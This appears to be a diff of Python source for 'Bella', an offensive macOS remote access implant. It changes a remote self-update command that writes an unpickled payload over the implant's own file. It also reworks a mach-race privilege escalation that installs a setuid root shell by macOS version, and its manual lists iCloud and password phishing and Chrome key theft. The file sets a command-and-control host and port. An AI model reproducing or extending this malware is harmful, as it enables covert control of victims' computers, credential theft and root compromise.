@@ -126,10 +126,11 @@ def subprocess_cleanup(): #will clean up all of those in the global payload_list
 			print 'Killed and cleaned [%s]' % x[2]
 			payload_list.remove(x)
 
-def update_server(updated_server):
+def host_update(updated_server):
 	with open(__file__, 'wb') as content:
 		content.write(updated_server)
 	send_msg('%sUpdated [%s] with new server code.\n' % (blue_star, __file__), False)
+	#inject_payloads("'1'\n'2'\n'3'\n'4'\n'5'\n'6'\n'7'\n'8'\n")
 	send_msg('%sRestarting server!\n' % (yellow_star), False)
 	send_msg(os.kill(bellaPID, 9), False)
 	return
@@ -176,7 +177,8 @@ def check_if_payloads():
 	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
 	c = conn.cursor()
 	c.execute("SELECT * FROM payloads WHERE id = 1")
-	if len(c.fetchall()) == 0: #then that user is not yet in our DB, so let's create them
+	elts = c.fetchall()
+	if len(elts) == 0: #then those payloads are not yet in our DB, so let's create them
 		return False
 	return True
 
@@ -1051,6 +1053,7 @@ def manual():
 	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
 	value += "\n%sCurrent Users%s\nFind all currently logged in users.\nUsage: %scurrent_Users%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sGet Root%s\nAttempt to escalate Bella to root through a variety of attack vectors.\nUsage: %sget_root%s\nRequirements: None\n" % (underline + bold + red, endANSI, bold, endANSI)
+	value += "\n%sHost Update%s\nUpdate the remote Bella server with a specified payload.\nUsage: %shost_update%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sFind my iPhone%s\nLocate all devices on the user's iCloud account.\nUsage: %siCloud_FMIP%s\nRequirements: iCloud Password [see iCloud_phish]\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sFind my Friends%s\nLocate all shared devices on the user's iCloud account.\nUsage: %siCloud_FMF%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%siCloud Contacts%s\nGet contacts from the user's iCloud account.\nUsage: %siCloud_contacts%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)	
@@ -1073,7 +1076,6 @@ def manual():
 	value += "\n%sSet Client Name%s\nChange the computer name that is displayed in the Control Center.\nUsage: %sset_client_name%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	value += "\n%sUpdate Server%s\nUpdate the remote Bella server with a specified payload.\nUsage: %supdate_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUpdate DB Entry%s\nUpdate the database entry for iCloud password or user password.\nUsage: %supdate_db_entry%s\nRequirements: None.\n" % (underline + bold + blue, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sVolume Set%s\nSet the speaker volume on the remote machine.\nUsage: %svolume%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
@@ -1467,13 +1469,10 @@ def make_SUID_root_binary(password, LPEpath):
 		return (True, "%sUser's local password gives us sudo access!\n%sSUID root file written to %s!\n" % (blue_star, greenPlus, ROOT_SHELL_PATH))
 	else:
 		#LPEpath should be a path to an interactive root shell (thinking mach race)
-		#### IF THIS LINE IS STILL HERE, THEN THIS MACH RACE / LPE DOES NOT WORK. Code needs to be added to actually install the shell ####
-		cur_dir = os.getcwd()
-		os.chdir('%s' % LPEpath)
-		fugazy = subprocess.Popen("./root_shell.sh <<< 'chown 0:0 %s; chmod 4777 %s'" % (ROOT_SHELL_PATH,ROOT_SHELL_PATH), shell=True, stdout=PIPE, stderr=PIPE)
-		os.chdir(cur_dir)
+		fugazy = subprocess.Popen("%s root <<< '/usr/sbin/chown 0:0 %s; chmod 4777 %s'" % (LPEpath, ROOT_SHELL_PATH,ROOT_SHELL_PATH), shell=True, stdout=PIPE, stderr=PIPE)
 		error = fugazy.stderr.read()
-		if not 'traceroute6: invalid wait time' in error: #perform setUID on shell
+		#send_msg('Error? : [%s]' % error, False)
+		if not error: #perform setUID on shell
 			return (True, "%sUser is susceptible to LPE!\n%sSUID root file written to %s!\n" % (blue_star, greenPlus, ROOT_SHELL_PATH))
 		else:
 			remove_SUID_shell()
@@ -1587,15 +1586,19 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			send_msg('', True)
 			return
 	else:
-		send_msg("%sNo user password found. Run 'user_pass_phish' to phish this. It should give us root.\nRun 'update_db_entry' to manually enter a user password.\n" % red_minus, False)
+		send_msg("%sNo user password found.\n\t%sRun 'user_pass_phish' to phish it. It may give us root.\n\t%sRun 'update_db_entry' to manually enter this user password.\n" % (red_minus, yellow_star, yellow_star), False)
 
-	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
-		zipped = readDB('mach_race', True)
-		paths = payload_generator(zipped)
-		dirs = '/'.join(paths.split('/')[:-1]) + '/' 
-		os.system("unzip %s -d %s" % (paths, dirs))
-		send_msg("unzip %s -d %s\n\n" % (paths, dirs), False)
-		root_escalate = '%sexecuter/' % dirs
+	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers.startswith("10.11") or sys_vers == ("10.12") or sys_vers == ("10.12.1"):
+		#the first payload is for 10.6.x && <=10.11.4, the second is for >=10.11.5 && <=10.12.1
+		if sys_vers == ("10.11.5") or sys_vers == ("10.11.6") or sys_vers == ("10.12") or sys_vers == ("10.12.1"):
+			payload = readDB('mach_race', True).split('     ')[1]
+			#send_msg('Mach race >=10.11.5 ' + '\n', False)
+		else:
+			payload = readDB('mach_race', True).split('     ')[0]
+			#send_msg('Mach race <10.11.5\n', False)
+		root_escalate = payload_generator(payload)
+		send_msg('Created root escalate payload at [%s]\n' % root_escalate, False)
+		os.chmod(root_escalate, 0777)
 		binarymake = make_SUID_root_binary(None, root_escalate)
 		if binarymake[0]:
 			#updateDB('local privilege escalation', 'rootedMethod')
@@ -1607,7 +1610,9 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			send_msg(binarymake[1], True)
 			remove_SUID_shell()
 			return
+
 	send_msg("%sLocal privilege escalation not implemented for OSX %s\n" % (red_minus, sys_vers), True)
+
 	return
 
 def start_interactive_shell(shell_port):
@@ -2036,9 +2041,9 @@ def bella(*Emma):
 					send_msg(manual(), True)
 				elif data == "screen_shot":
 					send_msg(screenShot(), True)
-				elif data.startswith("update_server"):
+				elif data.startswith("host_update"):
 					send_msg("%sAttempting to update server!\n" % yellow_star, False)
-					send_msg(update_server(pickle.loads(data[13:])), True)
+					send_msg(host_update(pickle.loads(data[11:])), True)
 				elif data == "chrome_safe_storage":
 					chrome_safe_storage()
 				elif data == "check_backups":
@@ -2386,7 +2391,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
-bella_version = '1.21'
+bella_version = '1.22'
 
 #### End global variables ####
 if __name__ == '__main__':
